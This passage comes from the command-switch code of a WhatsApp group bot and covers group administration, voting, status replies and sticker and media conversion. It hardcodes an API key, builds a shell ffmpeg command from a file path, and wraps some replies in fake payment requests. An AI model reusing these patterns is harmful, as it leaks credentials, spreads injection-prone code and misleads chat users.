                case 'userjid':{
          	if(!XeonTheCreator) return XeonStickOwner()
        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      replygcxeon(textt)
    }
    break
    case 'creategc': case 'creategroup': {
if (!XeonTheCreator) return XeonStickOwner()
if (!args.join(" ")) return replygcxeon(`Use ${prefix+command} groupname`)
try {
let cret = await XeonBotInc.groupCreate(args.join(" "), [])
let response = await XeonBotInc.groupInviteCode(cret.id)
const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
XeonBotInc.sendMessage(m.chat, { text:teksop, mentions: await XeonBotInc.parseMention(teksop)}, {quoted:m})
} catch {
	replygcxeon(`Error`)
	}
}
break
    case 'setbotbio':{
if (!XeonTheCreator) return XeonStickOwner()
if (!text) return replygcxeon(`Where is the text?\nExample: ${prefix + command} Cheems Bot`)
    await XeonBotInc.updateProfileStatus(text)
    replygcxeon(`Success in changing the bio of bot's number`)
    }
    break
    case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return XeonStickGroup()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (!isBotAdmins) return XeonStickBotAdmin()
    await XeonBotInc.removeProfilePicture(from)
    }
    break
    case 'deleteppbot': case 'delppbot': {
if (!XeonTheCreator) return XeonStickOwner()
    await XeonBotInc.removeProfilePicture(XeonBotInc.user.id)
    replygcxeon(`Success in deleting bot's profile picture`)
    }
    break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return XeonStickGroup()
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
                if (!isBotAdmins) return XeonStickBotAdmin()
                if (!text) return replygcxeon('Text ?')
                await XeonBotInc.groupUpdateDescription(m.chat, text)
                replygcxeon(mess.done)
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
            case 'setgrouppp':
            case 'setgruppp':
            case 'setgcpp':
                if (!m.isGroup) return XeonStickGroup()
                if (!isAdmins) return replygcxeon(mess.admin)
                if (!isBotAdmins) return XeonStickBotAdmin()
                if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image Caption Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await XeonBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                } else {
                    var memeg = await XeonBotInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return XeonStickGroup()
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
                if (!isBotAdmins) return XeonStickBotAdmin()
                let me = m.sender
                let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝\n😶 *Tagger :*  @${me.split('@')[0]}\n🌿 *Message : ${q ? q : 'no message'}*\n\n`
                for (let mem of participants) {
                teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
                }
                XeonBotInc.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'hidetag':
                if (!m.isGroup) return XeonStickGroup()
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
                if (!isBotAdmins) return XeonStickBotAdmin()
                XeonBotInc.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'totag':
                if (!m.isGroup) return XeonStickGroup()
                if (!isBotAdmins) return XeonStickBotAdmin()
                if (!isAdmins) return replygcxeon(mess.admin)
                if (!m.quoted) return replygcxeon(`Reply media with caption ${prefix + command}`)
                XeonBotInc.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
            break
            case 'group':
            case 'grup':
                if (!m.isGroup) return XeonStickGroup()
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
                if (!isBotAdmins) return XeonStickBotAdmin()
                if (args[0] === 'close') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcxeon(`Success Closing Group`))
                } else if (args[0] === 'open') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcxeon(`Success Opening Group`))
                } else {
                    replygcxeon(`Mode ${command}\n\n\nKetik ${prefix + command}open/close`)
                }
            break
            case 'editinfo':
                if (!m.isGroup) return XeonStickGroup()
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
                if (!isBotAdmins) return XeonStickBotAdmin()
                if (args[0] === 'open') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcxeon(`Successfully Opened Edit Group Info`))
                } else if (args[0] === 'close') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => replygcxeon(`Successfully Closed Edit Group Info`))
                } else {
                    replygcxeon(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
            break
            case 'linkgroup':
            case 'linkgrup':
            case 'linkgc':
            case 'gclink':
            case 'grouplink':
            case 'gruplink':
                if (!m.isGroup) return XeonStickGroup()
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
                if (!isBotAdmins) return XeonStickBotAdmin()
                let response = await XeonBotInc.groupInviteCode(m.chat)
                XeonBotInc.sendText(m.chat, `👥 *GROUP LINK*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
            break
            case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await XeonBotInc.fetchStatus(who)
    replygcxeon(bio.status)
  } catch {
    if (text) return replygcxeon(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await XeonBotInc.fetchStatus(who)
      replygcxeon(bio.status)
    } catch {
      return replygcxeon(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
        break
        case 'vote': {
            if (!m.isGroup) return XeonStickGroup()
            if (m.chat in vote) return replygcxeon(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
            if (!text) return replygcxeon(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
            replygcxeon(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            XeonBotInc.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return XeonStickGroup()
            if (!(m.chat in vote)) return replygcxeon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcxeon('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            XeonBotInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
                case 'downvote': {
            if (!m.isGroup) return XeonStickGroup()
            if (!(m.chat in vote)) return replygcxeon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcxeon('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            XeonBotInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
                 
case 'checkvote':
if (!m.isGroup) return XeonStickGroup()
if (!(m.chat in vote)) return replygcxeon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${XeonBotInc.user.id}
`
XeonBotInc.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return XeonStickGroup()
            if (!(m.chat in vote)) return replygcxeon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replygcxeon('Successfully Deleted Vote Session In This Group')
	    }
            break
break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return XeonStickGroup()
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
                if (!isBotAdmins) return XeonStickBotAdmin()
                await XeonBotInc.groupRevokeInvite(m.chat)
                    .then(res => {
                        replygcxeon(`Reset Success`)
                    })
            break
                //bot status
            case 'ping': case 'botstatus': case 'statusbot': case 'p': {
	const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
	XeonBotInc.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'INR',
          amount1000: 999999999,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: respon,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, {})
    }
	
	break
	case 'repo': case 'repository': {
  try {
    const [, username, repoName] = botscript.match(/github\.com\/([^/]+)\/([^/]+)/)
    const response = await axios.get(`https://api.github.com/repos/${username}/${repoName}`)
    if (response.status === 200) {
      const repoData = response.data
      const formattedInfo = `
${themeemoji} Repository Name: ${repoData.name}
${themeemoji} Description: ${repoData.description}
${themeemoji} Owner: ${repoData.owner.login}
${themeemoji} Stars: ${repoData.stargazers_count}
${themeemoji} Forks: ${repoData.forks_count}
${themeemoji} URL: ${repoData.html_url}
     
 `.trim()
      await XeonBotInc.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'INR',
          amount1000: 69000,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: formattedInfo,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, {})
    } else {
      await replygcxeon(`Unable to fetch repository information`)
    }
  } catch (error) {
    console.error(error)
    await replygcxeon(`Repository currently not available `)
  }
}
break
            case 'buypremium':
            case 'premiumuser': {
                let teks = `👋\nWant to Buy Premium?Just chat with the owner😉`
                await XeonBotInc.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://telegra.ph/file/9c90e2d490aef81155dbb.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
              
            case 'bot': {
    let teks = global.bot(prefix)
    await XeonBotInc.sendMessage(m.chat, {
        text: teks
    }, {
        quoted: m
    })
}
break
            case 'fiturpremium': {
    let teks = global.fiturpremium(prefix)
    await XeonBotInc.sendMessage(m.chat, {
        text: teks
    }, {
        quoted: m
    })
}
break    
            
            case 'rentbot':
                replygcxeon(`Type ${prefix}owner and chat him`)
                break
                case'menulist':
         replygcxeon(`*MENULIST*\n•.allmenu\n•.downloadmenu\n•.funmenu\n•.aimenu\n•.groupmenu\n•.ownermenu\n•.photooproxymenu\n•.ephoto360menu\n•.animemenu\n•.nsfwmenu\n•.randomphotomenu\n•.randomvideomenu\n•.stickermenu\n•.databasemenu\n•.stalkermenu\n•.bugmenu\n•.othermenu`)
                break
            case 'speedtest': {
                replygcxeon('Testing Speed...')
                let cp = require('child_process')
                let {
                    promisify
                } = require('util')
                let exec = promisify(cp.exec).bind(cp)
                let o
                try {
                    o = await exec('python speed.py')
                } catch (e) {
                    o = e
                } finally {
                    let {
                        stdout,
                        stderr
                    } = o
                    if (stdout.trim()) XeonBotInc.sendMessage(m.chat, {
                        text: stdout,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://telegra.ph/file/9c90e2d490aef81155dbb.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                    if (stderr.trim()) XeonBotInc.sendMessage(m.chat, {
                        text: stderr,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://telegra.ph/file/9c90e2d490aef81155dbb.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'runtime':
                let pinga = `Bots Have Been Running For ${runtime(process.uptime())}`
                XeonBotInc.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://telegra.ph/file/9c90e2d490aef81155dbb.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
                case 'mulaiabsen': {
if (!isGroup) return replygcxeon('Hanya Di Group')
    const chatId = m.chat; 
    const userId = m.sender;

    
    if (absenData[chatId]) {
        throw 'Absen sudah dimulai di obrolan ini!';
    }

   
    absenData[chatId] = {
        admin: userId, 
        participants: [], 
    };

    
    replygcxeon('Absen telah dimulai! Gunakan perintah *.absen* untuk bergabung dalam absen ini.');
}
break;


case 'absen': {
if (!isGroup) return replygcxeon('Hanya Di Group')
    const chatId = m.chat; 
    const userId = m.sender; 

   
    if (!absenData[chatId]) {
        throw 'Tidak ada proses absen yang sedang berlangsung di obrolan ini!';
    }
    absenData[chatId].participants.push(userId);

    replygcxeon('Anda telah berhasil bergabung dalam proses absen!');
}
break;

case 'cekabsen': {
if (!isGroup) return replygcxeon('Hanya Di Group')
    const chatId = m.chat; 
    if (!absenData[chatId]) {
        throw 'Tidak ada proses absen yang sedang berlangsung di obrolan ini!';
    }

    
    const participants = absenData[chatId].participants;

    replygcxeon(`Daftar peserta absen:\n${participants.join(', ')}`);
}
break;

case 'hapusabsen': {
if (!isGroup) return replygcxeon('Hanya Di Group')
    const chatId = m.chat;
    if (absenData[chatId] && absenData[chatId].admin === m.sender) {
      
        delete absenData[chatId];
        
        replygcxeon('Proses absen telah dihapus!');
    } else {
        throw 'Anda tidak memiliki izin untuk menghapus proses absen!';
    }
}
break    
case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
let me = m.sender
let teks = `*「  ${global.botname} Script 」*\n\nLink1: ${global.websitex}\nLink2: ${global.botscript}\n\nHi @${me.split('@')[0]} 👋\nYow`
sendXeonBotIncMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
            case 'owner': {
                XeonBotInc.sendMessage(from, {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list
                    }
                }, {
                    quoted: m
                })
            }
            break
            
            //convert
case 's':
case 'sticker':
case 'stiker': {
    if (!isPremium) {
        limitData[m.sender] = limitData[m.sender] || 0;
        if (limitData[m.sender] >= dailyLimit) {
            return replygcxeon(`*MAAF, LIMIT STICKER HARIAN KAMU HABIS.*

Untuk mendapatkan limit tanpa batas, silahkan daftar sebagai *Member Premium*.

Biaya: *10K per bulan*

Hubungi Admin di sini:
https://chat.whatsapp.com/Iv3jpjyVZ2bFGNYVD6C6sD`);
        }
    }

    if ((quoted.msg?.seconds || quoted.seconds || 0) > 11) return replygcxeon(`*Bukan gitu caranya cuy.*  
caranya tuh, lu kirim foto/video terus dikasih caption atau dikasih tulisan .s  
*ngerti gak ???*  

*kalo gak ngerti silahkan lu masuk grup wa admin ya*  
*nanti diajarin sama member disitu*  
https://chat.whatsapp.com/Iv3jpjyVZ2bFGNYVD6C6sD 

_${prefix+command}_  
kalo udah paham silahkan dicoba lagi`);

    if (/image/.test(mime)) {
        let media = await quoted.download()
        let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, {
            packname: global.packname,
            author: global.author
        })
    } else if (/video/.test(mime)) {
        if ((quoted.msg?.seconds || quoted.seconds || 0) > 11) return replygcxeon(`*Bukan gitu caranya cuy.*  
caranya tuh, lu kirim foto/video terus dikasih caption atau dikasih tulisan .s  
*ngerti gak ???*  

*kalo gak ngerti silahkan lu masuk grup wa admin ya*  
*nanti diajarin sama member disitu*  
https://chat.whatsapp.com/Iv3jpjyVZ2bFGNYVD6C6sD 

_${prefix+command}_  
kalo udah paham silahkan dicoba lagi`);

        let media = await quoted.download()
        let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, {
            packname: global.packname,
            author: global.author
        })
    } else {
        return replygcxeon(`*Bukan gitu caranya cuy.*  
Caranya tuh, lu kirim foto/video terus dikasih caption atau dikasih tulisan .s  
*Ngerti gak ???*  

*Kalo gak ngerti silahkan lu masuk grup WA admin ya*  
*Nanti diajarin sama member di situ*  
https://chat.whatsapp.com/Iv3jpjyVZ2bFGNYVD6C6sD  

Silahkan coba lagi dengan mengetik: *${prefix+command}*`);
    }

    if (!isPremium) {
        limitData[m.sender] += 1;
        db.data.limitstiker = limitData;
        db.write();

        let sisaLimit = dailyLimit - limitData[m.sender];
        replygcxeon(`*Sticker berhasil dibuat!*\n*Limit terpakai 1.*\n*Sisa limit hari ini: ${sisaLimit}/${dailyLimit}.*`);
    }
}
break;

            case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPremium) return replyprem(mess.premium)
if (!args.join(" ")) return replygcxeon(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
XeonBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcxeon(`Photo/Video?`)
}
}
break
            case 'toimage':
case 'toimg': {
    if (!isPremium) return replygcxeon(`*MAAF, FITUR INI KHUSUS UNTUK MEMBER PREMIUM*

*SILAHKAN HUBUNGI ADMIN UNTUK MENDAFTAR SEBAGAI MEMBER PREMIUM*
*BIAYANYA 10 RIBU PER BULAN*`)

    if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + command}*`)
    
    await XeonStickWait()
    let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
    let ran = await getRandom('.png')
    
    exec(`ffmpeg -i ${media} ${ran}`, (err) => {
        fs.unlinkSync(media)
        if (err) return err
        let buffer = fs.readFileSync(ran)
        XeonBotInc.sendMessage(m.chat, {
            image: buffer
        }, {
            quoted: m
        })
        fs.unlinkSync(ran)
    })
}
break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + command}*`)
                await XeonStickWait()
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await XeonBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
                await XeonStickWait()
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                XeonBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio that you want to make into MP3 with captions ${prefix + command}`)
                await XeonStickWait()
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                XeonBotInc.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `dgxeon.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio that you want to make into a VN with captions ${prefix + command}`)
                await XeonStickWait()
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                XeonBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + command}*`)
                await XeonStickWait()
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await XeonBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                await XeonStickWait()
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replygcxeon(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replygcxeon(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replygcxeon(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replygcxeon(`Example : ${prefix + command} 😅+🤔`)
                await XeonStickWait()
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
            case 'emojimix2': {
                if (!text) return replygcxeon(`Example : ${prefix + command} 😅`)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
                for (let res of anu.results) {
                    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return replygcxeon(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                    XeonBotInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: mess.done,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                    XeonBotInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: mess.done,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/audio/.test(mime)) {
                   bebasap = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                   XeonBotInc.sendMessage(m.chat, {
                     audio: {
                        url: bebasap
                     },
                     mimetype: 'audio/mpeg',
                     ptt: true,
                     viewOnce: true
                   })
                }
            }
            break
            case 'fliptext': {
                if (args.length < 1) return replygcxeon(`Example:\n${prefix}fliptext dgxeon`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replygcxeon(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'toqr':{
  if (!q) return replygcxeon(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
